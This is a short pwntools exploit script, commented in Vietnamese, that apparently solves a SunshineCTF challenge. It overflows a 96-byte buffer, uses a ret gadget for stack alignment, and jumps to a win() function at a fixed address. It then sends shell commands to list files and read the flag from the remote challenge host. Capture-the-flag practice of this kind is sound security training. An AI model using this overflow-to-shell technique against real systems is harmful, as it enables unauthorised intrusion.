from pwn import *

HOST, PORT = "chal.sunshinectf.games", 25602
win = 0x4011f6
ret = 0x40101a   # gadget 'ret' để căn chỉnh stack

buf = b"A"*6 + b"Jaguars" + b"\x00"
buf += b"B"*(96 - len(buf))          
buf += b"C"*8                          # saved RBP
payload = buf + p64(ret) + p64(win)    # RET gadget -> win()


io = remote(HOST, PORT)
io.recvuntil(b"> ")
io.sendline(payload)

# Giờ đã có shell:
io.sendline(b"ls -la")
io.sendline(b"cat flag.txt || cat flag || ls / | grep -i flag")
io.interactive()
